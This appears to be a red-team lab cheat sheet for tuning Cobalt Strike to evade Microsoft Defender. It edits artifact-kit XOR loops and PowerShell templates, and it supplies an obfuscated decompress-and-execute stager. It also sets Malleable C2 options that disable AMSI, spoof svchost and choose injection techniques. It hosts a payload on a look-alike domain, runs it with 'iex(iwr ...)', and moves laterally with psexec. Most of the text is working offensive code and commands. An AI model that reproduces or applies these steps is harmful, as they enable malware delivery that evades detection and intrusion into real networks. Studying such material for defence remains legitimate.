
### Artifacts

Open the artifacts folder (`arsenal-kit\kits\artifact`) within Visual Studio Code and open up `src-common/patch.c`

On line ~45 modify the for loop. **This is for the svc exe payloads.**
```c
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

On line ~116 modify the other for loop. **This is for the normal exe payloads.**
```c
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

Save the changes (**File > Save**) and close the folder (**File > Close Folder**).

Run **build.sh** to build the new artifacts.
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

>The stage size tends to vary between CS releases as features get added or removed from Beacon.  Always run build.sh without arguments first to see what the minimum stage sizes are.

Import the `artifact.cna` file into the Cobalt Strike script manager - `C:\Tools\cobaltstrike\custom-artifacts\mailslot`

---

### Resources

Open the resource folder in the arsenal-kit and build new resources
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource

./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

Open up the custom-resources folder in VS code

> Edit **template.x64.ps1** with the following

Rename **ALL**`func_get_proc_address` on line **3** to (Use Edit > Replace): 
```powershell
get_proc_address
```

Rename **ALL** `func_get_delegate_type` on line **10** to (Use Edit > Replace):
```powershell
get_delegate_type
```

Replace line **32** with:
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll WriteProcessMemory), (get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

> Now obfuscate **compress.ps1** 

Use Invoke-Obfuscate to create a unique obfuscated version of the script. Choose anyone except for string obfuscation because of the `%%DATA%%`

```powershell
ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
Invoke-Obfuscation

Invoke-Obfuscation> SET SCRIPTBLOCK [compress.ps1 contents]
```

Or use this:
```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

Import the `resources.cna` file into the Cobalt Strike script manager - `C:\Tools\cobaltstrike\custom-resources\`

---

### Malleable C2

SSH into the Cobalt Strike instance and open up the profiles folder
```bash
cd /opt/cobaltstrike/profiles
```

Edit **default.profile** and add the following stage block:
```bash
stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}
```

Add the following post-ex block:
```bash
post-ex {
  set amsi_disable "true";
  set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

```

Add the following process-inject block:
```bash
process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}
```

Save changes and restart the Team Server
```powershell
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

> If the container fails to restart properly use `sudo /usr/bin/docker logs cobaltstrike-cs-1` to see the profile errors.

---

### Test

Build new payloads:
- Go to **Payloads > Windows Stageless Generate All Payloads**

Test stageless payload against ThreatCheck
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
```

Test PowerShell payload against ThreatCheck
```powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
```


Host a 64-bit PowerShell payload.
1. Go to **Site Management > Host File**
2. File: _C:\Payloads\http_x64.ps1_
3. Local URI: /test
4. Local Host: www.bleepincomputer.com

Verify that Defender is enabled and execute up on test host
```powershell
(Get-MpPreference).DisableRealtimeMonitoring

iex(iwr "http://www.bleepincomputer.com/test" -useb)
```

Verify Defender is on on remote host
```powershell
remote-exec winrm lon-ws-1 (Get-MpPreference).DisableRealtimeMonitoring
```

Change `spawnto` for the service payload
```powershell
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

Now lateral movement can be used with the service payload
```powershell
jump psexec64 lon-ws-1 smb
```